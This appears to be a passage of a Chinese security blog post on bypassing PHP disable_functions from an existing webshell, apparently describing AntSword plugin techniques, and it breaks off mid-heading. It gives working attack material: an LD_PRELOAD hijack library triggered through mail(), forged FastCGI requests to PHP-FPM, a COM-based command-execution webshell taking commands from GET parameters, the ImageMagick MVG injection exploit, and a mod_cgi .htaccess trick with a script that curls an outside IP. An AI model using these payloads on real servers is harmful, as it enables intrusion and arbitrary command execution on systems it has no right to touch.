title="linux–蚁剑插件–LD_PRELOAD"></a>linux–蚁剑插件–LD_PRELOAD</h4><p>LD_PRELOAD 是Linux的环境变量，它允许你定义在程序运行前优先加载的别的动态链接库，甚至覆盖正常的函数库。</p><p>例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> passwd[] = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage: %s &lt;password&gt;/n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(passwd, argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Correct Password!/n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Invalid Password!/n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述程序使用标准C函数<code>strcmp</code>函数来做比较，这是一个外部调用函数，我们来重新编写一个同名函数,代码如下(保存如下代码为b.c)：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1, <span class="keyword">const</span> <span class="keyword">char</span> *s2)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hack functio  n invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n&quot;</span>, s1, s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译以上代码为一个动态共享库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared b.c -o b.so</span><br></pre></td></tr></table></figure><p>通过LD_PRELOAD来设置它能被其他调用它的程序优先加载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD&#x3D;&quot;.&#x2F;b.so&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;a bbb</span><br><span class="line">Correct Password!</span><br></pre></td></tr></table></figure><p>随意输入字符串都会显示密码正确，这说明程序在运行时优先加载了我们自己编写的程序。</p><p>程序在运行过程中调用了某个标准的动态链接库的函数，那么我们就有机会通过LD_PRELOAD来设置它优先加载我们自己编写的程序，实现劫持。</p><p>在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件，so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的。</p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mail()函数和error_log()函数所调用的sendmail已安装</span><br><span class="line">不限制 &#x2F;usr&#x2F;sbin&#x2F;sendmail 的执行</span><br><span class="line">mail()函数和error_log()函数有一个未被禁用</span><br></pre></td></tr></table></figure><h5 id="结合mail-函数"><a href="#结合mail-函数" class="headerlink" title="结合mail 函数"></a>结合mail 函数</h5><p>sendmail函数在运行过程动态调用了很多标准库函数。</p><p>编制我们自己的动态链接程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC a.c -o a</span><br><span class="line">gcc -shared a -o a.so</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span></span>&#123;</span><br><span class="line">         FILE*fp = fopen(<span class="string">&quot;/tmp/2.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">         fclose(fp);</span><br><span class="line">         system(<span class="string">&quot;mkdir /var/www/html/test&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span><span class="params">()</span></span>&#123;</span><br><span class="line">  FILE *fp1=fopen(<span class="string">&quot;/tmp/2.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(fp1!=<span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   fclose(fp1);</span><br><span class="line">         <span class="keyword">return</span> <span class="number">552</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         payload();</span><br><span class="line">         <span class="keyword">return</span> <span class="number">552</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用webshell，上传编译后的a.so到目标服务器</p><p>通过putenv来设置LD_PRELOAD，让我们的程序优先被调用。在webshell上用mail函数发送一封邮件来触发。利用代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   putenv(<span class="string">&quot;LD_PRELOAD=/var/www/html/a.so&quot;</span>);</span><br><span class="line">   mail(<span class="string">&quot;[email protected]&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="蚁剑插件实现思路"><a href="#蚁剑插件实现思路" class="headerlink" title="蚁剑插件实现思路"></a>蚁剑插件实现思路</h5><p>可以看出利用的关键就是我们自己构造的动态连接程序，在我们自己的动态连接程序中可以指定任何的想执行的代码，在蚁剑中，动态连接程序的主要作用就是生成一个新的php服务，其中的php.ini配置是默认的，不会存在函数限制，进而我们可以执行任何命令。在蚁剑中也是调用了mail函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  putenv(<span class="string">&quot;LD_PRELOAD=/tmp/hack.so&quot;</span>);</span><br><span class="line">  error_log(<span class="string">&quot;a&quot;</span>,<span class="number">1</span>);</span><br><span class="line">  mail(<span class="string">&quot;a@localhost&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hack.so会调用php开启一个默认配置的PHPServer，并在web目录生成一个.antproxy.php，与新PHPServer建立Socket连接，转发流量到index.php一句话执行命令。</p><h4 id="linux–蚁剑插件–Fastcgi-PHP-FPM"><a href="#linux–蚁剑插件–Fastcgi-PHP-FPM" class="headerlink" title="linux–蚁剑插件–Fastcgi/PHP-FPM"></a>linux–蚁剑插件–Fastcgi/PHP-FPM</h4><p>CGI是一种协议，web服务器运行时外部程序的规范，是为了解决web服务器与其他应用之间的通信问题。Fastcgi是为了弥补CGI的缺陷而产生的。PHP-FPM 则是php环境中对Fastcgi协议的管理程序实现。</p><p>这里我们看一下php-fmp的主要作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">www.example.com&#x2F;index.php</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">      nginx</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">加载nginx的fast-cgi模块</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">fast-cgi对根据fast-cgi协议请求包进行封装，然后将封装好的包发给php-fpm</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm 据fast-cgi协议将TCP流解析成真正的数据,调用php文件</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm处理完请求，返回给nginx</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">nginx将结果通过http返回给浏览器</span><br></pre></td></tr></table></figure><p>可以看到php-fmp的作用就是解析流量，拿到真正的数据然后把数据传递给nignx，fpm与nginx之间的通信方式有tcp和套接字(unix socket)两种方式，所以可以利用 WebShell 直接与 PHP FastCGI (FPM) 来实现Bypass Disable Functions。</p><h5 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h5><h6 id="伪造fast-cgi数据包"><a href="#伪造fast-cgi数据包" class="headerlink" title="伪造fast-cgi数据包"></a>伪造fast-cgi数据包</h6><p>总的思路就是伪造fatcgi数据包让php-fpm去解析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py 127.0.0.1 -p 9000 本地已经存在的php文件，比如&#x2F;steady.php -c &#39;&lt;?php echo &#96;id&#96;;exit;?&gt;&#39;</span><br></pre></td></tr></table></figure><p>本地必须要有一个一直的PHP文件，因为php-fpm拿到fastcgi数据包后，先回去判断客户端请求的文件是否存在（即fastcgi数据包中的文件名），如果不存在就不会执行。</p><p>伪造的协议包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;hackme.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;hackme.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?test&#x3D;1&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;hackme.php?test&#x3D;1&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;6666&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,</span><br><span class="line">    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置auto_prepend_file = php://input以及allow_url_include = On，实现在执行php文件执行前进行远程文件包含POST内容，从而任意代码执行。</p><h6 id="使用webshell攻击PHP-FPM–蚁剑插件"><a href="#使用webshell攻击PHP-FPM–蚁剑插件" class="headerlink" title="使用webshell攻击PHP-FPM–蚁剑插件"></a>使用webshell攻击PHP-FPM–蚁剑插件</h6><p>上传php文件，用来重新启动一个web服务，web服务的php.ini不再是原本服务的php.ini，进而绕过了原本服务的函数限制。</p><p>.antproxy.php分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    set_time_limit(120);</span><br><span class="line">    $aAccess &#x3D; curl_init();</span><br><span class="line">    curl_setopt($aAccess, CURLOPT_URL, &quot;http:&#x2F;&#x2F;127.0.0.1:60733&#x2F;index.php?&quot;.$_SERVER[&#39;QUERY_STRING&#39;]);</span><br></pre></td></tr></table></figure><p>像本地的60733端口发起请求，60733端口新启了一个web服务程序，启动命令为(该命令的启动是由于下文中的so文件执行导致)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -n -S 127.0.0.1:63611 -t &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-S 127.0.0.1:63611：新Web服务的监听地址；</span><br><span class="line">-t &#x2F;var&#x2F;www&#x2F;html&#x2F;：新HTTP服务的Web根目录，可随便指，只要保证那个目录下面有个PHP WebShell就行，建议是直接指定成Shell当前目录；</span><br><span class="line">-n：表示不使用php.ini，这个新的服务PHP用的是默认配置，是核心所在，从而根本不受php.ini中disable_functions的影响，当使用代理连接到该PHP服务时也就实现Bypass了；</span><br></pre></td></tr></table></figure><p>.69773ant_x64.so分析</p><p>主要作用就是执行恶意命令，其中的命令就是新起PHP服务的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -n -S 127.0.0.1:63611 -t &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure><p>so文件是如何执行的？</p><p>Nginx为fastcgi 提供了 fastcgi_param 来主要处理映射关系，将 Nginx 中的变量翻译成 PHP 能够理解的变量，也就是说fastcgi也是有变量的，类似于PHP的预定义变量。</p><p>例如用户访问<code>http://127.0.0.1/steady.php?test=1</code>，假设web目录为/var/www/html，那么请求会被解析成如下键值对：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;hackme.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;hackme.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?test&#x3D;1&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;hackme.php?test&#x3D;1&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;6666&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中fast-cgi有两个变量<code>PHP_VALUE及PHP_ADMIN_VALUE</code>，他们的作用就是可以指定修改范围为<code>PHP_INI_USER和PHP_INI_ALL</code>的php配置项的值。而php配置项<code>auto_prepend_file</code>的作用就是执行任何php文件加载之前执行的文件。通过以下指令，来实现该功能，这里如果把文件改为上文的so文件即可执行，然后重新启动一个web服务进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_param PHP_VALUE &quot;auto_prepend_file&#x3D;&#x2F;steady.php&quot;;</span><br></pre></td></tr></table></figure><p>最终流程：</p><ul><li><p>随机生成一个端口号，作为后续新起的PHP服务的端口。</p></li><li><p>判断当前PHP-FPM与nignx为TCP模式或Unix Socket模式来据此获得FPM地址和端口。</p></li><li><p>生成用于执行php命令来生成一个新的php服务的so文件并上传。</p></li><li><p>开始绕过</p><p>初始化fastcgi客户端</p><p>伪造fastcgi数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$content&#x3D;&quot;&quot;;</span><br><span class="line">$client &#x3D; new Client(&#39;$&#123;fpm_host&#125;&#39;,$&#123;fpm_port&#125;);</span><br><span class="line">$client-&gt;request(array(</span><br><span class="line">  &#39;GATEWAY_INTERFACE&#39; &#x3D;&gt; &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">  &#39;REQUEST_METHOD&#39; &#x3D;&gt; &#39;POST&#39;,</span><br><span class="line">  &#39;SERVER_SOFTWARE&#39; &#x3D;&gt; &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">  &#39;REMOTE_ADDR&#39; &#x3D;&gt; &#39;127.0.0.1&#39;,</span><br><span class="line">  &#39;REMOTE_PORT&#39; &#x3D;&gt; &#39;9984&#39;,</span><br><span class="line">  &#39;SERVER_ADDR&#39; &#x3D;&gt; &#39;127.0.0.1&#39;,</span><br><span class="line">  &#39;SERVER_PORT&#39; &#x3D;&gt; &#39;80&#39;,</span><br><span class="line">  &#39;SERVER_NAME&#39; &#x3D;&gt; &#39;mag-tured&#39;,</span><br><span class="line">  &#39;SERVER_PROTOCOL&#39; &#x3D;&gt; &#39;HTTP&#x2F;1.1&#39;,</span><br><span class="line">  &#39;CONTENT_TYPE&#39; &#x3D;&gt; &#39;application&#x2F;x-www-form-urlencoded&#39;,</span><br><span class="line">  &#39;PHP_VALUE&#39; &#x3D;&gt; &#39;extension&#x3D;$&#123;p&#125;&#39;,</span><br><span class="line">  &#39;PHP_ADMIN_VALUE&#39; &#x3D;&gt; &#39;extension&#x3D;$&#123;p&#125;&#39;,</span><br><span class="line">  &#39;CONTENT_LENGTH&#39; &#x3D;&gt; strlen($content)</span><br><span class="line">  ),</span><br><span class="line">  $content</span><br><span class="line">);</span><br><span class="line">sleep(1);</span><br><span class="line">echo(1);</span><br></pre></td></tr></table></figure><p>着重看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;PHP_VALUE&#39; &#x3D;&gt; &#39;extension&#x3D;$&#123;p&#125;&#39;,</span><br><span class="line">&#39;PHP_ADMIN_VALUE&#39; &#x3D;&gt; &#39;extension&#x3D;$&#123;p&#125;&#39;,</span><br></pre></td></tr></table></figure><p>他们的作用就是执行我们的so文件，进而生成新的php进程。</p></li><li><p>最后向php-fmp发送fastcgi请求包，加载so文件，启动新的php服务，加载新的php.ini配置文件</p></li></ul><h4 id="win-系统组件绕过"><a href="#win-系统组件绕过" class="headerlink" title="win-系统组件绕过"></a>win-系统组件绕过</h4><p>window com组件(php 5.4)(高版本扩展要自己添加）,要在php.ini中开启。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.allow_dcom &#x3D; true</span><br><span class="line">extension &#x3D; php_com_dotnet.dll</span><br></pre></td></tr></table></figure><p>通过COM组件直接调用WScript.shell或Shell.Application执行系统命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用代码，利用shell上传如下代码到目标服务器上</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command=$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">&quot;cmd /c &quot;</span>.$command); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ImageMagick漏洞"><a href="#ImageMagick漏洞" class="headerlink" title="ImageMagick漏洞"></a>ImageMagick漏洞</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Disable Functions: &quot;</span> . ini_get(<span class="string">&#x27;disable_functions&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">$command = PHP_SAPI == <span class="string">&#x27;cli&#x27;</span> ? $argv[<span class="number">1</span>] : $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($command == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    $command = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exploit = &lt;&lt;&lt;EOF</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox <span class="number">0</span> <span class="number">0</span> <span class="number">640</span> <span class="number">480</span></span><br><span class="line">fill <span class="string">&#x27;url(https://example.com/image.jpg&quot;|$command&quot;)&#x27;</span></span><br><span class="line">pop graphic-context</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">&quot;KKKK.mvg&quot;</span>, $exploit);</span><br><span class="line">$thumb = <span class="keyword">new</span> Imagick();</span><br><span class="line">$thumb-&gt;readImage(<span class="string">&#x27;KKKK.mvg&#x27;</span>);</span><br><span class="line">$thumb-&gt;writeImage(<span class="string">&#x27;KKKK.png&#x27;</span>);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(<span class="string">&quot;KKKK.mvg&quot;</span>);</span><br><span class="line">unlink(<span class="string">&quot;KKKK.png&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="蚁剑插件–Apache-Mod-CGI"><a href="#蚁剑插件–Apache-Mod-CGI" class="headerlink" title="蚁剑插件–Apache Mod CGI"></a>蚁剑插件–Apache Mod CGI</h4><p>主要原理就是在<code>.htaccess </code>文件中设置指令，通过<code>apache cgi-script</code>执行脚本。</p><p>Mod CGI就是把PHP做为APACHE一个内置模块，让apache http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP，在<code>.htacess</code>中可以设置以下指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">添加Options +ExecCGI，代表着允许使用mod_cgi模块执行CGI脚本。</span><br><span class="line">添加AddHandler cgi-script .cgi，代表着包含.cgi扩展名的文件都将被视为CGI程序。</span><br><span class="line">也可以是</span><br><span class="line">AddHandler cgi-script .sh</span><br></pre></td></tr></table></figure><p>上传 sh 文件，浏览器访问即可执行其中的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &quot;Content-type: text&#x2F;html&quot;</span><br><span class="line">echo &quot;Hello, Shell&quot;</span><br><span class="line">curl 192.168.214.107:7777</span><br></pre></td></tr></table></figure><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li><p>Apache 开启 AllowOverride</p><p>当apache配置文件中指定web目录下AllowOverride参数值为None 时，.htaccess 文件无法生效。</p><p>在apache2.3.8版本之前AllowOverride参数值默认设置为 All，.htaccess 文件设置的指令可生效。</p></li><li><p>开启 cgi_module</p></li><li><p>.htaccess 文件可写</p></li><li><p>cgi 程序可执行</p></li></ul><h4 id="蚁剑插件–Json-Serializer-UAF"><a href="#蚁剑插件–Json-Serializer-UAF" class="headerlink" title="蚁剑插件–Json Serializer UAF"></a>蚁剑插件–Json Serializer UAF</h4><h5 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h5><p>影响范围是linux，php7.0-7.3</p><p>php-json-bypass漏洞利用json序列化程序中的堆溢出触发，以绕过disable_functions并执行系统命令。</p><h4 id="蚁剑插件–HP7-GC-with-Certain-Destructors-UAF"><a href="#蚁剑插件–HP7-GC-with-Certain-Destructors-UAF" class="headerlink" title="蚁剑插件–HP7 GC with Certain Destructors UAF"></a>蚁剑插件–HP7 GC with Certain Destructors UAF</h4><h5 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h5><p>影响范围是linux，php 7.1-7.3</p><p>php7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令。</p><h4 id="蚁剑插件–FFI-Bypass"><a href="#蚁剑插件–FFI-Bypass" class="headerlink" title="蚁剑插件–FFI Bypass"></a>蚁剑插件–FFI 